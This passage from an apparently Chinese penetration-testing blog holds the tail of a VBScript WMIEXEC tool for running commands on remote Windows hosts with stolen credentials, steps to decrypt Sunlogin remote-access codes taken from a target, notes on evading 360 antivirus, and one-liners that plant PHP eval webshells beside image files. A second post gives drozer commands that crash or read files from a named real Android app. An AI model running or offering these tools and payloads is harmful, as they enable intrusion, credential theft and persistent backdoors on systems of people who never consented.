class="line">DestFolder &#x3D; Exec(command， file)</span><br><span class="line">If CurrentFolder &#x3D; DestFolder Then </span><br><span class="line">WScript.Echo &quot;The system cannot find the path specified.&quot;</span><br><span class="line">Else</span><br><span class="line">CurrentFolder &#x3D; DestFolder</span><br><span class="line">End If</span><br><span class="line">ElseIf strResult &#x3D; &quot;persist&quot; Then</span><br><span class="line">boolPersist &#x3D; True</span><br><span class="line">&#39;WScript.Echo &quot;persist&quot;</span><br><span class="line">Exec command，&quot;nul&quot;</span><br><span class="line">&#39;##########################################toDo</span><br><span class="line">&#39;-----------&lt;&lt;&lt;&lt;</span><br><span class="line">Else</span><br><span class="line">On Error Resume Next</span><br><span class="line">err.clear</span><br><span class="line">Exec command， file</span><br><span class="line">ReadResult()</span><br><span class="line">    If err.number &lt;&gt; 0 Then wscript.echo( &quot;WMIEXEC ERROR: &quot; &amp; Err.Number &amp; &quot; &quot; &amp; err.description)</span><br><span class="line">Err.Clear</span><br><span class="line">    On Error Goto 0</span><br><span class="line">End If</span><br><span class="line">loop</span><br><span class="line"></span><br><span class="line">strDelFile &#x3D; &quot;del &quot; &amp; file &amp; &quot; &#x2F;F&quot;</span><br><span class="line">Exec strDelFile，&quot;nul&quot;</span><br><span class="line">If intArgCount &gt; 3 Then </span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">strNetUse &#x3D; &quot;cmd.exe &#x2F;c net use \\&quot; &amp; host &amp; &quot; &#x2F;del&quot;</span><br><span class="line">objShell.Run strNetUse，0</span><br><span class="line">End If</span><br><span class="line">DeleteShare()</span><br><span class="line"></span><br><span class="line">&#39;#####################################</span><br><span class="line">Function PhraseCmd(cmd)</span><br><span class="line">PhraseCmd &#x3D; False &#39; not &#39;cd&#39;</span><br><span class="line">arrCommand &#x3D; Split(cmd)</span><br><span class="line">strExe &#x3D; arrCommand(0)</span><br><span class="line">If LCase(Trim(strExe)) &#x3D; &quot;cd&quot; Or LCase(Trim(strExe)) &#x3D; &quot;cd.exe&quot; Then PhraseCmd &#x3D; &quot;cd&quot;  &#39; is &#39;cd&#39;</span><br><span class="line">Set regEx &#x3D; New RegExp</span><br><span class="line">regEx.Pattern &#x3D; &quot;^[a-z]:$&quot;</span><br><span class="line">regEx.IgnoreCase &#x3D; True</span><br><span class="line">Set Matches &#x3D; regEx.Execute(cmd)</span><br><span class="line">If Matches.Count &lt;&gt; 0 Then PhraseCmd &#x3D; &quot;cd&quot; &#39; is &#39;d:&#39;</span><br><span class="line">&#39;phrase time command</span><br><span class="line">regEx.Pattern &#x3D; &quot;(.*?)-wait(\d+)&quot;</span><br><span class="line">regEx.IgnoreCase &#x3D; True</span><br><span class="line">Set Matches &#x3D; regEx.Execute(cmd)</span><br><span class="line">If Matches.Count &lt;&gt; 0 Then </span><br><span class="line">Set objMatch &#x3D; Matches(0)</span><br><span class="line">command &#x3D; objMatch.SubMatches(0)</span><br><span class="line">&#39;WScript.Echo &quot;Command :&quot; &amp; command</span><br><span class="line">WAITTIME &#x3D; CInt(objMatch.SubMatches(1))</span><br><span class="line">WScript.Echo &quot;WMIEXEC : Waiting &quot; &amp; WAITTIME &amp; &quot; ms...&quot; &amp; vbNewLine</span><br><span class="line">End If</span><br><span class="line">&#39;phrase persist command</span><br><span class="line">regEx.Pattern &#x3D; &quot;(.*?)-persist&quot;</span><br><span class="line">regEx.IgnoreCase &#x3D; True</span><br><span class="line">Set Matches &#x3D; regEx.Execute(cmd)</span><br><span class="line">If Matches.Count &lt;&gt; 0 Then </span><br><span class="line">Set objMatch &#x3D; Matches(0)</span><br><span class="line">command &#x3D; objMatch.SubMatches(0)</span><br><span class="line">PhraseCmd &#x3D; &quot;persist&quot;  &#39; is quiet</span><br><span class="line">End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function CreateShare()</span><br><span class="line">&#39;create share</span><br><span class="line">Set objNewShare &#x3D; objWMIService.Get(&quot;Win32_Share&quot;)</span><br><span class="line">intReturn &#x3D; objNewShare.Create _</span><br><span class="line">    (FilePath， &quot;WMI_SHARE&quot;， 0， 25， &quot;&quot;)</span><br><span class="line">If intReturn &lt;&gt; 0 Then</span><br><span class="line">WScript.Echo &quot;WMIEXEC ERROR: Share could not be created.&quot; &amp; _</span><br><span class="line">        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn</span><br><span class="line">    Select Case intReturn</span><br><span class="line">    Case 2</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;</span><br><span class="line">    Case 9</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Invalid File Path!&quot;</span><br><span class="line">    Case 22</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Share Name Already In Used!&quot;</span><br><span class="line">    Case 24</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Directory NOT exists!&quot;</span><br><span class="line">    End Select</span><br><span class="line">If intReturn &lt;&gt; 22 Then WScript.Quit</span><br><span class="line">Else</span><br><span class="line">    WScript.Echo &quot;WMIEXEC : Share created sucess.&quot;</span><br><span class="line">WScript.Echo &quot;WMIEXEC : Share Name -&gt; WMI_SHARE&quot;</span><br><span class="line">WScript.Echo &quot;WMIEXEC : Share Path -&gt; &quot; &amp; FilePath</span><br><span class="line">End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function DeleteShare()</span><br><span class="line">Set colShares &#x3D; objWMIService.ExecQuery _</span><br><span class="line">(&quot;Select * from Win32_Share Where Name &#x3D; &#39;WMI_SHARE&#39;&quot;)</span><br><span class="line">For Each objShare In colShares</span><br><span class="line">intReturn &#x3D; objShare.Delete</span><br><span class="line">Next</span><br><span class="line">If intReturn &lt;&gt; 0 Then</span><br><span class="line">WScript.Echo &quot;WMIEXEC ERROR: Delete Share failed.&quot; &amp; _</span><br><span class="line">        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn</span><br><span class="line">    Select Case intReturn</span><br><span class="line">    Case 2</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;</span><br><span class="line">    Case 25</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Share Not Exists!&quot;</span><br><span class="line">    End Select</span><br><span class="line">Else</span><br><span class="line">    WScript.Echo &quot;WMIEXEC : Share deleted sucess.&quot;</span><br><span class="line">End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function Exec(cmd， file)</span><br><span class="line">Set objStartup &#x3D; objWMIService.Get(&quot;Win32_ProcessStartup&quot;)</span><br><span class="line">Set objConfig &#x3D; objStartup.SpawnInstance_</span><br><span class="line">objConfig.ShowWindow &#x3D; 12</span><br><span class="line"></span><br><span class="line">Set objProcess&#x3D;objWMIService.get(&quot;Win32_Process&quot;)</span><br><span class="line">strExec &#x3D; &quot;cmd.exe &#x2F;c &quot; &amp; cmd &amp; &quot; &gt; &quot; &amp; file &amp; &quot; 2&gt;&amp;1&quot;  &#39;2&gt;&amp;1 err</span><br><span class="line">If boolPersist Then</span><br><span class="line">strExec &#x3D; cmd</span><br><span class="line">intPath &#x3D; InStr(cmd，&quot;\&quot;)</span><br><span class="line">If intPath &#x3D; 0 Then strExec &#x3D; CurrentFolder &amp; &quot;\&quot; &amp; strExec</span><br><span class="line">End If</span><br><span class="line">&#39;WScript.Echo strExec</span><br><span class="line">intReturn &#x3D; objProcess.Create _</span><br><span class="line">    (strExec， CurrentFolder， objConfig， intProcessID)  &#39;Add CurrentFolder (strExec， Null， objConfig， intProcessID)</span><br><span class="line">If intReturn &lt;&gt; 0 Then</span><br><span class="line">WScript.Echo &quot;WMIEXEC ERROR: Process could not be created.&quot; &amp; _</span><br><span class="line">        vbNewLine &amp; &quot;WMIEXEC ERROR: Command -&gt; &quot; &amp; cmd &amp; _</span><br><span class="line">        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn</span><br><span class="line">    Select Case intReturn</span><br><span class="line">    Case 2</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;</span><br><span class="line">Case 3</span><br><span class="line">WScript.Echo &quot;WMIEXEC ERROR: Insufficient Privilege!&quot;</span><br><span class="line">    Case 9</span><br><span class="line">    WScript.Echo &quot;WMIEXEC ERROR: Path Not Found!&quot;</span><br><span class="line">    End Select</span><br><span class="line">Else</span><br><span class="line">&#39;    WScript.Echo &quot;Process created.&quot; &amp; _</span><br><span class="line">&#39;        vbNewLine &amp; &quot;Command: &quot; &amp; cmd &amp; _</span><br><span class="line">&#39;        vbNewLine &amp; &quot;Process ID: &quot; &amp; intProcessID</span><br><span class="line">If boolPersist Then WScript.Echo &quot;WMIEXEC : Process created. PID: &quot;&amp; intProcessID</span><br><span class="line">    If boolGetFolder &#x3D; True Then </span><br><span class="line">    boolGetFolder &#x3D; False</span><br><span class="line">    Exec &#x3D; GetCurrentFolder()</span><br><span class="line">    Exit Function</span><br><span class="line">    End If</span><br><span class="line">    &#39;ReadResult()</span><br><span class="line">End If</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function ReadResult()</span><br><span class="line">WScript.Sleep(WAITTIME)</span><br><span class="line">UNCFilePath &#x3D; &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName</span><br><span class="line">Set fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Set objFile &#x3D; fso.OpenTextFile(UNCFilePath， 1)</span><br><span class="line">If Not objFile.AtEndOfStream Then strContents &#x3D; objFile.ReadAll</span><br><span class="line">objFile.Close</span><br><span class="line">WScript.Echo strContents</span><br><span class="line">&#39;fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder</span><br><span class="line">strDelFile &#x3D; &quot;del &quot; &amp; file &amp; &quot; &#x2F;F&quot;</span><br><span class="line">Exec strDelFile，&quot;nul&quot;</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function GetCurrentFolder()</span><br><span class="line">WScript.Sleep(WAITTIME)</span><br><span class="line">UNCFilePath &#x3D; &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName</span><br><span class="line">Set fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Set objFile &#x3D; fso.OpenTextFile(UNCFilePath， 1)</span><br><span class="line">GetCurrentFolder &#x3D; objFile.ReadLine</span><br><span class="line">objFile.Close</span><br><span class="line">strDelFile &#x3D; &quot;del &quot; &amp; file &amp; &quot; &#x2F;F&quot;</span><br><span class="line">Exec strDelFile，&quot;nul&quot;</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">保存上面内容为vv.vbs，命令行如下</span><br><span class="line">cscript.exe &#x2F;&#x2F;nologo vv.vbs &#x2F;shell 1.1.1.1 用户名 密码</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220117162706080.png" alt="image-20220117162706080"></p><h2 id="向日葵口令解密"><a href="#向日葵口令解密" class="headerlink" title="向日葵口令解密"></a>向日葵口令解密</h2><p>使用<a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a></p><p>找到向日葵配置文件config.ini</p><p>向日葵默认配置文件路径:</p><p>安装版：C:\Program Files\Oray\SunLogin\SunloginClient\config.ini</p><p>便携版(绿色版)：C:\ProgramData\Oray\SunloginClient\config.ini</p><p>把目标机器上的config.ini替换自己机器上对应的向日葵目录下config.ini，然后用sundecrypt.py跑encry_pwd出来的值就是验证码，fastcode就是识别码，注意跑完之后把自己原本的config.ini替换回来，不然自己的向日葵码就和目标机一样了，另外有时候向日葵验证码在连接退出之后会变化。</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220118140702198.png" alt="image-20220118140702198"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一个问题，曾经想过在目标机器上开启向日葵，然后通过向日葵远程到目标机器上退出360.</span><br><span class="line">向日葵挺大，同一个向日葵，通过冰蝎上传的向日葵无法运行，通过哥斯拉的大文件上传功能上去才可以运行。</span><br><span class="line">上传的向日葵简约版，双击运行后出现uac界面，但测试发现无论但是、否、右上叉都还是能运行向日葵</span><br><span class="line">但问题是无论是冰蝎还是哥斯拉，cmd启动向日葵都会被360告警，cs上启动不会告警，但是上cs的免杀马通过webshell启动也会被360告警</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220118141934237.png" alt="image-20220118141934237"></p><h2 id="无回显命令执行判断和写马"><a href="#无回显命令执行判断和写马" class="headerlink" title="无回显命令执行判断和写马"></a>无回显命令执行判断和写马</h2><p>当发现一个疑似命令执行的地方但是没有回显，可以用ping判断，通过设置ping的次数和请求时间判断是否成功执行了命令.而且win和linux的ping次数是不同参数，也可也用这个方法判断机器类型.</p><p>windows指定ping次数是-n</p><p>linux指定ping次数是-c</p><p>像下图-c分别指定2次和6次，时间差别不大，说明要么没命令执行，要么是win命令执行</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211170424359.png" alt="image-20220211170424359"></p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211170500038.png" alt="image-20220211170500038"></p><p>用win的-n参数和返回时间可以明显看出存在win命令执行</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211170656817.png" alt="image-20220211170656817"></p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211170742008.png" alt="image-20220211170742008"></p><p>盲写马</p><p>windows盲写</p><p>在网站路径下找到一个静态文件，比如onlyOne.jpg，执行下面的命令就会在相同的目录下新写onlyOne.jpg.php文件。这个命令会遍历盘符，建议从D盘开始，测试时用c盘发现时间比较久</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r D:\  %i  in  (only*.jpg) do @echo  ^&lt;?php @eval($_POST[1]);?^&gt; &gt; %i.php</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211173312818.png" alt="image-20220211173312818"></p><p>url中直接写就可以</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211222704426.png" alt="image-20220211222704426"></p><p>linux盲写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#96;find &#x2F; -name &quot;test.jpg&quot;&#96;; do echo &quot;&lt;?php @eval(\$_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt;&#96;basename $i&#96;.php; done</span><br></pre></td></tr></table></figure><p>测试时发现在哪个目录执行的命令，文件就写在哪个目录下，而非像win一样写在所查找文件相同的目录</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211221651034.png" alt="image-20220211221651034"></p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211221908920.png" alt="image-20220211221908920"></p><p>而且linux要求要有写的权限</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20220211223751182.png" alt="image-20220211223751182"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>app学习</title>
      <link href="2022/01/04/app%E5%AD%A6%E4%B9%A0/"/>
      <url>2022/01/04/app%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参考大佬文章:https:&#x2F;&#x2F;bbs.pediy.com&#x2F;user-home-905443.htm</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1mF3yBmnj7qMPz4ReDs-Gcg ，提取码：l8pk； &#x2F;&#x2F;安装包</span><br><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1oCDoRNY9Bl0MUs2YuFQZmw ，提取码：gr12； &#x2F;&#x2F;测试所用apk</span><br><span class="line">java版本：java version &quot;1.8.0_271&quot;</span><br><span class="line">adb和模拟器：使用雷电模拟器，自带adb和启动开发者usb调试模式</span><br><span class="line"></span><br><span class="line">一般来说，在模拟器或实机中，连点设置中的版本号可以启动开发者模式，然后在开发者模式中打开usb调试，adb需要这一步</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104221844857.png" alt="image-20220104221844857"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104221833304.png" alt="image-20220104221833304"></p><p>然后把agent.apk安装到模拟器上，然后adb连接模拟器，其实它自己都连上了，然后在drozer安装目录开启转发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb devices &#x2F;&#x2F;查看当前连接设备</span><br><span class="line">adb forward tcp:31415 tcp:31415&#x2F;&#x2F;开启转发</span><br><span class="line">drozer.bat console connect &#x2F;&#x2F;连接</span><br></pre></td></tr></table></figure><p>然后模拟器上打开agent.bak启动服务</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104222500179.png" alt="image-20220104222500179"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104222517785.png" alt="image-20220104222517785"></p><p>出现这兔头标志表示连接成功</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104222739486.png" alt="image-20220104222739486"></p><p>可以看到这个绿点也亮起了</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104222801637.png" alt="image-20220104222801637"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list &#x2F;&#x2F;列出设备中所有已经安装的App包列表</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104222922572.png" alt="image-20220104222922572"></p><p>出现中文乱码的解决方式，编辑drozer\Lib\drozer\modules\app\package.py，下图阴影部分如果没有就添加上</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104223051639.png" alt="image-20220104223051639"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220104223150617.png" alt="image-20220104223150617"></p><h2 id="应用安全"><a href="#应用安全" class="headerlink" title="应用安全"></a>应用安全</h2><p>Activity（界面）：通常展现为一个可视化的用户界面，是负责与用户交互的组件。常见的漏洞包括Activity劫持漏洞、越权漏洞等。</p><p>Service（服务）：无用户界面，是运行于后台的服务，但是及其重要，经常在后台执行一些敏感的操作。常见的漏洞包括权限提升，拒绝服务攻击等。</p><p>Broadcase receiver（广播接收器）：无用户界面，能够启动一个 activity 或 serice来响应它们收到的信息，或者用 NotificationManager 来通知用户。当应用广播接收器默认设置exported=’true’，导致应用可能接收到第三方恶意应用伪造的广播，利用这一漏洞，攻击者可以在用户手机通知栏上推送任意消息，通过配合其它漏洞盗取本地隐私文件和执行任意代码。</p><p>Content provider（内容提供者）：为存储和获取数据提供统一的接口，可以在不同的应用程序之间共享数据。常见的漏洞包括读写权限漏洞、SQL注入漏洞、文件遍历漏洞等。</p><h3 id="activity组件安全"><a href="#activity组件安全" class="headerlink" title="activity组件安全"></a>activity组件安全</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Activity的组件导出，一般会导致的问题：Android Browser Intent Scheme URLs的攻击手段</span><br><span class="line">(1)拒绝服务攻击：通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验</span><br><span class="line">(2)越权攻击：Activity用户界面绕过会造成用户信息窃取、Activity界面被劫持产生欺诈等安全事件</span><br><span class="line">(3)组件导出导致钓鱼欺诈</span><br><span class="line">(4)隐式启动intent包含敏感数据</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Android系统中，Activity默认是不导出的，如果设置了exported &#96;&#96;&#x3D;&#96; &#96;&quot;true&quot;&#96; &#96;这样的关键值或者是添加了&lt;intent&#96;&#96;-&#96;&#96;filter&#96;&#96;&gt;这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211100539736.png" alt="image-20220211100539736"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220211100656187.png" alt="image-20220211100656187"></p><h4 id="调用暴露的activity组件"><a href="#调用暴露的activity组件" class="headerlink" title="调用暴露的activity组件"></a>调用暴露的activity组件</h4><p>一般activity组件只会暴露一个程序启动界面，再暴露其他的就属于组件暴露，有安全隐患。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a 包名&#x2F;&#x2F;查看activity组件信息</span><br><span class="line">run app.activity.start --component 包名 组件名&#x2F;&#x2F;调用暴露的activity组件</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220117101037736.png" alt="image-20220117101037736"></p><p>如上图，上面示例程序sieve有三个activity组件permission要求为空，下面是九江银行移动外访平台的包，只有一个要求为空，调用暴露的activity组件就会发现sieve可以调出其他app页面不安全，而九江银行移动外访平台这个为空的是app程序启动界面，所以安全。</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220117101806234.png" alt="image-20220117101806234"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220117101900234.png" alt="image-20220117101900234"></p><h4 id="Activity劫持"><a href="#Activity劫持" class="headerlink" title="Activity劫持"></a>Activity劫持</h4><p>如果apk未对界面劫持进行反劫持检测，那么用户就会受到劫持欺骗攻击。如果一个恶意应用在用户启动银行app时，启动自身界面，模拟成银行的登录界面，那么在用户没有察觉的情况下，可以直接偷走用户输入的账号密码。简而言之，测试app在进入后台时有没有提示信息或其他告警动作。</p><p>测试方法，在测试app界面调用其他界面，比如hijack，看是否有告警信息，比如下图就无告警信息，实现劫持。</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220117105408996.png" alt="image-20220117105408996"></p><h4 id="利用暴露的Activity组件造成拒绝服务"><a href="#利用暴露的Activity组件造成拒绝服务" class="headerlink" title="利用暴露的Activity组件造成拒绝服务"></a>利用暴露的Activity组件造成拒绝服务</h4><p>以宜昌市民e家3.7.3apk为例,找到暴露的activity组件,尝试传递畸形数据让app崩溃</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210140105444.png" alt="image-20220210140105444"></p><p>然后jadx逆向工具查看apk源码,挨个搜索这些类,查看类内容,比如com.bt.ycehome.ui.modules.jr.TakeIDCardActivity类</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210140427742.png" alt="image-20220210140427742"></p><p>然后android中数据传递常用到Intent。一方把数据存入Intent中，另一方取出。看上图是通过getIntent()传递数据.也可以用new Intent()传递数据.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.c &#x3D; getIntent().getExtras().getInt(&quot;capture_mode&quot;, 0); &#x2F;&#x2F;getInt代表传递的值是整型值,capture_mode是参数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.bt.ycehome.ui com.bt.ycehome.ui.modules.jr.TakeIDCardActivity --extra integer capture_mode 4 </span><br><span class="line">&#x2F;&#x2F;该句是拒绝服务攻击语句</span><br><span class="line">&#x2F;&#x2F;run app.activity.start --component com.bt.ycehome.ui com.bt.ycehome.ui.modules.jr.TakeIDCardActivity调用该组件</span><br><span class="line">&#x2F;&#x2F;--extra 向该组件传递数据,格式–extra TYPE KEY VALUE</span><br><span class="line">&#x2F;&#x2F;integer 传递类型,根据代码而定,也就是上面的整型.关于参数类型参考下图.</span><br><span class="line">&#x2F;&#x2F;capture_mode 参数名</span><br><span class="line">&#x2F;&#x2F;4 参数值,不清楚为什么是4,测试发现大于等于4的都可以触发拒绝服务</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210143249204.png" alt="image-20220210143249204"></p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210142858128.png" alt="image-20220210142858128"></p><h4 id="利用暴露的Activity组件访问指定地址和文件内容"><a href="#利用暴露的Activity组件访问指定地址和文件内容" class="headerlink" title="利用暴露的Activity组件访问指定地址和文件内容"></a>利用暴露的Activity组件访问指定地址和文件内容</h4><p>以宜昌市民e家3.7.3apk为例,查看到com.kexun.loan.sdk.ui.CrossActivity时</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210144428940.png" alt="image-20220210144428940"></p><p>传递了三个字符型参数param、loginClassName和realAuthClassName.</p><p>param传递给了sringExtra存在后续调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSONObject jSONObject &#x3D; new JSONObject(stringExtra); &#x2F;&#x2F;要求json格式的字符型值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.bt.ycehome.ui com.kexun.loan.sdk.ui.CrossActivity --extra string param &#123;\&quot;serverUrl\&quot;:\&quot;file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.bt.ycehome.ui&#x2F;shared_prefs&#x2F;setForm.xml\&quot;&#125;</span><br><span class="line">&#x2F;&#x2F;该条语句读取该app下的setForm.xml文件,是个配置文件,测试读非该app目录下的文件不成功</span><br><span class="line">&#x2F;&#x2F;--extra string 传递字符串类型数据</span><br><span class="line">&#x2F;&#x2F;param 传递参数名</span><br><span class="line">&#x2F;&#x2F;&#123;\&quot;serverUrl\&quot;:\&quot;file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.bt.ycehome.ui&#x2F;shared_prefs&#x2F;setForm.xml\&quot;&#125; 传递的json值,serverUrl是代码中的key名,value值是用file协议读取文件内容.报告里面value值是file:&#x2F;&#x2F;&#x2F;sdcard&#x2F;getfile.html,试了没成功,文件管理器也没搜到该文件.</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210145633529.png" alt="image-20220210145633529"></p><p>访问网页</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210150642400.png" alt="image-20220210150642400"></p><p>com.kexun.loan.sdk.ui.CrossWebViewActivity传递的是一个htmlUrl参数,也是一个字符串类型的地址参数,不是json格式的就直接用双引号指定就行.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.bt.ycehome.ui com.kexun.loan.sdk.ui.CrossWebViewActivity --extra string htmlUrl &quot;file:&#x2F;&#x2F;&#x2F;data&#x2F;data&#x2F;com.bt.ycehome.ui&#x2F;shared_prefs&#x2F;setForm.xml&quot; &#x2F;&#x2F;查看文件内容</span><br><span class="line">run app.activity.start --component com.bt.ycehome.ui com.kexun.loan.sdk.ui.CrossWebViewActivity --extra string htmlUrl &quot;https:&#x2F;&#x2F;www.baidu.com&quot; &#x2F;&#x2F;访问地址</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210151517323.png" alt="image-20220210151517323"></p><h3 id="service组件安全（不懂）"><a href="#service组件安全（不懂）" class="headerlink" title="service组件安全（不懂）"></a>service组件安全（不懂）</h3><p>这个组件是用来处理后台的任务的,比如后台下载和放歌等,没有界面.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a package_name &#x2F;&#x2F;查看Services组件信息</span><br><span class="line">run app.service.start --action 服务名 --component 包名 服务名 &#x2F;&#x2F;调用组件</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210171911102.png" alt="image-20220210171911102"></p><p>上面显示服务均为引用外部服务，如果引用外部组件，一般不测试；内部服务一般为包名加服务名。</p><p><img src="/../../../../images/app%E5%AD%A6%E4%B9%A0/image-20220210171946044.png" alt="image-20220210171946044"></p><p>由于没有界面,调用service组件后也没有回显,要通过<kbd>adb shell</kbd>获取手机shell,使用ps命令查看后台服务是否启动</p><p><img 